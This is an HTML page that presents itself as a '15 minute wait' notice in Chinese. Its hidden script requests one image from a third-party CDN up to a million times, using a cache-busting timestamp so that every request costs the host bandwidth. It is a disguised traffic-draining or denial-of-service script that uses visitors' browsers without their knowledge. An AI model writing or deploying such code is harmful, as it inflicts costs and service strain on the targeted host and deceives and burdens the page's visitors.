<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>预计需等待15分钟</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            overflow: hidden;
            font-family: Arial, sans-serif;
        }
    </style>
</head>
<body>
<h1>预计需等待15分钟</h1>
<script>
    let imageCount = 0; 
    const totalImages = 1000000; 
    function loadImage() {
        const img = new Image();
        img.src = 'https://staticsns.cdn.bcebos.com/amis/2024-12/1733110167508/ec2943f8f5e27bd38f00c6e02.png?' + new Date().getTime(); // 防止缓存
        img.style.display = 'none'; 
        img.onload = function() {
            imageCount++;
            if (imageCount < totalImages) {
                loadImage(); 
            }
        };
        document.body.appendChild(img);
    }
    loadImage();
</script>
</body>
</html>
